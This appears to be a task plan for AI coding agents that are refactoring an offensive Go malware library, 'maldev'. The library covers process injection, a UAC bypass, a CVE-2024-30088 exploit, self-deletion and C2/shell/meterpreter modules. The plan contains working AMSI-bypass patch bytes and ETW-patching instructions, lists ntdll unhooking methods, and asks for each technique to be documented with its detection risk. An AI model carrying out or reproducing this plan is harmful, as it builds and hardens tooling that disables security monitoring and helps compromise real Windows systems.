# maldev Refactoring & Quality Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
> **REQUIRED SKILL:** Apply `.claude/skills/go-conventions.md` to ALL code modifications.

**Goal:** Fix all bugs found in audit, replace x/sys/windows duplicates, implement stub packages, apply naming conventions, document every package and technique.

**Architecture:** Fix in dependency order (core -> win -> evasion -> injection -> rest), commit after each task.

**Tech Stack:** Go 1.20, golang.org/x/sys/windows, purego, saferwall/pe

---

## Phase 1: Critical Bug Fixes (DO FIRST)

### Task 1: Fix selfdelete NTFS ADS stream

**Files:**
- Modify: `cleanup/selfdelete/selfdelete_windows.go:55-72`

- [ ] **Step 1: Fix FILE_RENAME_INFO size calculation**

The current code uses `unsafe.Sizeof(lpwStream)` which gives pointer size (8 bytes) instead of actual UTF-16 string length.

```go
// BEFORE (broken):
fRename.FileNameLength = uint32(unsafe.Sizeof(lpwStream))

// AFTER (correct):
fRename.FileNameLength = uint32(len(dsStreamRename)-1) * 2  // UTF-16 byte length without null
```

- [ ] **Step 2: Fix RtlCopyMemory size**

```go
// BEFORE (broken):
api.ProcRtlCopyMemory.Call(
    uintptr(unsafe.Pointer(&fRename.FileName[0])),
    uintptr(unsafe.Pointer(lpwStream)),
    unsafe.Sizeof(lpwStream),  // WRONG: copies 8 bytes
)

// AFTER (correct):
api.ProcRtlCopyMemory.Call(
    uintptr(unsafe.Pointer(&fRename.FileName[0])),
    uintptr(unsafe.Pointer(lpwStream)),
    uintptr(fRename.FileNameLength),  // copies actual string
)
```

- [ ] **Step 3: Fix SetFileInformationByHandle total size**

```go
// size should include struct header + filename bytes
totalSize := unsafe.Offsetof(fRename.FileName) + uintptr(fRename.FileNameLength)
```

- [ ] **Step 4: Commit**
```bash
git commit -m "fix(selfdelete): correct FILE_RENAME_INFO size calculations for NTFS ADS"
```

### Task 2: Fix deprecated rand.Seed

**Files:**
- Modify: `privilege/uacbypass/uacbypass_windows.go`

- [ ] **Step 1: Remove rand.Seed call**

```go
// DELETE this line:
rand.Seed(time.Now().UnixNano())
// Go 1.20+ auto-seeds the global rand source
```

- [ ] **Step 2: Commit**

---

## Phase 2: Replace x/sys/windows Duplicates

### Task 3: Replace duplicate procs in win/api/ with x/sys/windows calls

**Files:**
- Modify: `win/api/dll_windows.go` — remove 14 duplicate proc declarations
- Modify: `win/api/structs_windows.go` — remove PROCESSENTRY32W
- Modify: ALL files that reference removed procs

- [ ] **Step 1: Remove duplicate procs from dll_windows.go**

Remove these (they have typed wrappers in x/sys/windows):
```
ProcCreateToolhelp32Snapshot → windows.CreateToolhelp32Snapshot()
ProcProcess32FirstW          → windows.Process32First()
ProcProcess32NextW           → windows.Process32Next()
ProcVirtualAlloc             → windows.VirtualAlloc()
ProcVirtualProtect           → windows.VirtualProtect()
ProcVirtualProtectEx         → windows.VirtualProtectEx()
ProcWriteProcessMemory       → windows.WriteProcessMemory()
ProcReadProcessMemory        → windows.ReadProcessMemory()
ProcOpenProcess              → windows.OpenProcess()
ProcCreateProcessW           → windows.CreateProcess()
ProcVirtualFree              → windows.VirtualFree()
ProcResumeThread             → windows.ResumeThread()
ProcRevertToSelf             → windows.RevertToSelf() (RevertToSelf in advapi32)
```

- [ ] **Step 2: Replace PROCESSENTRY32W with windows.ProcessEntry32**

In `process/enum/enum_windows.go`, replace:
```go
// BEFORE:
var entry api.PROCESSENTRY32W
entry.DwSize = uint32(unsafe.Sizeof(entry))

// AFTER:
var entry windows.ProcessEntry32
entry.Size = uint32(unsafe.Sizeof(entry))
```

- [ ] **Step 3: Update all call sites**

Search all `_windows.go` files for references to removed procs and replace with typed wrappers.
Each file needs `"golang.org/x/sys/windows"` import added if not present.

- [ ] **Step 4: Build all modules, fix compilation errors**

```bash
for mod in core win evasion injection privilege process system pe cleanup c2 cve/CVE-2024-30088; do
  cd /c/Users/m.bachmann/GolandProjects/maldev/$mod && go build ./...
done
```

- [ ] **Step 5: Commit**
```bash
git commit -m "refactor(win/api): replace 14 duplicate procs with x/sys/windows typed wrappers"
```

### Task 4: Consolidate duplicate LogonUserW

**Files:**
- Modify: `win/privilege/admin_windows.go` — remove duplicate
- Modify: `win/impersonate/impersonate_windows.go` — keep canonical version

- [ ] **Step 1: Move LogonUserW to win/api/ or keep in impersonate only**
- [ ] **Step 2: Update privilege/ to import from impersonate/ or use api.ProcLogonUserW**
- [ ] **Step 3: Commit**

---

## Phase 3: Implement Stub Packages

### Task 5: Implement evasion/amsi (currently empty stub)

**Files:**
- Modify: `evasion/amsi/amsi_windows.go`
- Source: `ignore/rshell/rshell/pkg/shell/evasion_windows.go` (AMSI section)

- [ ] **Step 1: Implement PatchAmsiScanBuffer()**

```go
// Patch: mov eax, 0x80070057; ret
func PatchAmsiScanBuffer() error {
    patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
    amsi := windows.NewLazySystemDLL("amsi.dll")
    proc := amsi.NewProc("AmsiScanBuffer")
    if err := proc.Find(); err != nil {
        return nil // AMSI not loaded, nothing to patch
    }
    return patchMemory(proc.Addr(), patch)
}
```

- [ ] **Step 2: Implement PatchAmsiOpenSession()**
- [ ] **Step 3: Implement patchMemory() helper with VirtualProtect**
- [ ] **Step 4: Test build, commit**

### Task 6: Implement evasion/etw (currently empty stub)

**Files:**
- Modify: `evasion/etw/etw_windows.go`
- Source: `ignore/antiforensic/ETWpatching.go`

- [ ] **Step 1: Implement PatchETW()**

Patch 5 ETW functions with `XOR RAX,RAX; RET` (48 33 C0 C3):
- EtwEventWrite, EtwEventWriteEx, EtwEventWriteFull, EtwEventWriteString, EtwEventWriteTransfer

Use `api.ProcEtwEventWrite` etc. for proc addresses. Use WriteProcessMemory for patching.

- [ ] **Step 2: Test build, commit**

### Task 7: Implement evasion/unhook (currently empty stub)

**Files:**
- Modify: `evasion/unhook/unhook_windows.go`

- [ ] **Step 1: Implement ClassicUnhook()** — restore first 5 bytes from fresh ntdll on disk
- [ ] **Step 2: Implement FullUnhook()** — replace entire .text section from disk
- [ ] **Step 3: Implement PerunUnhook()** — spawn suspended notepad, read pristine ntdll
- [ ] **Step 4: Test build, commit**

---

## Phase 4: Naming Convention Pass

### Task 8: Apply go-conventions skill to all packages

For each module, check and fix:

- [ ] **Step 1: Scan for naming violations**
```bash
# Find snake_case exports
grep -rn "func [A-Z].*_[A-Z]" --include="*.go" .
# Find chattery names
grep -rn "func.*Package.*Package" --include="*.go" .
# Find bad receiver names
grep -rn "func (self\|this\|me " --include="*.go" .
# Find type-in-name
grep -rn "String\|Int\|Slice\|Map" --include="*.go" . | grep -v test | grep "var \|:= "
```

- [ ] **Step 2: Fix ID casing** — `SessionId` → `SessionID`, `ProcessId` → `ProcessID`
- [ ] **Step 3: Fix acronym casing** — `Http` → `HTTP`, `Url` → `URL`, `Dns` → `DNS`
- [ ] **Step 4: Fix chatter** — remove package name from exported identifiers where appropriate
- [ ] **Step 5: Fix receiver names** — ensure consistency per type
- [ ] **Step 6: Commit**

---

## Phase 5: Documentation

### Task 9: Document every package

Each package gets a `doc.go` with:
- Package purpose
- Technique name (MITRE ATT&CK ID if applicable)
- Windows APIs used
- Detection risk level
- Usage example

- [ ] **Step 1: core/ packages** (crypto, encode, hash, utils, compat)
- [ ] **Step 2: win/ packages** (api, version, token, privilege, domain, impersonate)
- [ ] **Step 3: evasion/ packages** (amsi, etw, unhook, acg, blockdlls, phant0m, antidebug, antivm, timing, sandbox)
- [ ] **Step 4: injection/ package** (all 8+3+2 methods documented)
- [ ] **Step 5: privilege/, process/, system/, pe/, cleanup/ packages**
- [ ] **Step 6: c2/ packages** (cert, transport, shell, meterpreter)
- [ ] **Step 7: cve/CVE-2024-30088/**
- [ ] **Step 8: Commit**

### Task 10: Create README.md

**Files:**
- Create: `README.md`

- [ ] **Step 1: Write README with module table, usage examples, build instructions**
- [ ] **Step 2: Commit and push**

---

## Phase 6: High/Medium Bug Fixes

### Task 11: Fix injection syscall number extraction

**Files:**
- Modify: `injection/injector_windows.go:600-615`

- [ ] **Step 1: Add bounds checking to getSyscallNumber() scan**
- [ ] **Step 2: Increase scan range from 10 to 32 bytes**
- [ ] **Step 3: Add fallback pattern for Win11 ntdll prologues**

### Task 12: Fix CVE race condition safety

**Files:**
- Modify: `cve/CVE-2024-30088/race.go`
- Modify: `cve/CVE-2024-30088/token.go`

- [ ] **Step 1: Add buffer size cap to handle enumeration (256MB max)**
- [ ] **Step 2: Add bounds validation before pointer arithmetic in race callback**
- [ ] **Step 3: Commit**

### Task 13: Fix c2/shell race conditions

**Files:**
- Modify: `c2/shell/shell.go`

- [ ] **Step 1: Replace doneCh close with sync.Once**
- [ ] **Step 2: Fix setRunning() to use atomic.CompareAndSwap**
- [ ] **Step 3: Commit**

### Task 14: Fix win/token zero token handle

**Files:**
- Modify: `win/token/token_windows.go`

- [ ] **Step 1: Replace `windows.Token(0)` with `windows.GetCurrentProcessToken()`**
- [ ] **Step 2: Commit**

---

## Phase 7: Final Validation

### Task 15: Full build + verify

- [ ] **Step 1: Build all modules for windows/amd64**
- [ ] **Step 2: Build all modules for linux/amd64**
- [ ] **Step 3: Run go vet on all modules**
- [ ] **Step 4: Verify .gitignore blocks ignore/**
- [ ] **Step 5: Final push to GitHub**

---

## Bug Summary from Audit

| # | Severity | File | Issue | Task |
|---|----------|------|-------|------|
| 1 | CRITICAL | selfdelete_windows.go:60 | Wrong Sizeof (pointer not string) | Task 1 |
| 2 | CRITICAL | selfdelete_windows.go:65 | Wrong copy size | Task 1 |
| 3 | HIGH | injector_windows.go:600 | No bounds check on syscall scan | Task 11 |
| 4 | HIGH | token.go:125 | Unbounded allocation loop | Task 12 |
| 5 | HIGH | race.go:196 | Unchecked pointer offset | Task 12 |
| 6 | MEDIUM | shell.go:91 | Channel closed twice | Task 13 |
| 7 | MEDIUM | shell.go:238 | Race in setRunning | Task 13 |
| 8 | LOW | uacbypass_windows.go:22 | Deprecated rand.Seed | Task 2 |
| 9 | LOW | amsi_windows.go | Empty stub | Task 5 |
| 10 | LOW | etw_windows.go | Empty stub | Task 6 |
| 11 | LOW | unhook_windows.go | Empty stub | Task 7 |

## x/sys/windows Duplicates Summary

| Custom Declaration | x/sys/windows Replacement | Task |
|---|---|---|
| ProcCreateToolhelp32Snapshot | windows.CreateToolhelp32Snapshot() | Task 3 |
| ProcProcess32FirstW/NextW | windows.Process32First/Next() | Task 3 |
| ProcVirtualAlloc/Protect/Free | windows.VirtualAlloc/Protect/Free() | Task 3 |
| ProcWriteProcessMemory | windows.WriteProcessMemory() | Task 3 |
| ProcOpenProcess | windows.OpenProcess() | Task 3 |
| ProcCreateProcessW | windows.CreateProcess() | Task 3 |
| PROCESSENTRY32W | windows.ProcessEntry32 | Task 3 |
| LogonUserW (2 copies) | single implementation | Task 4 |
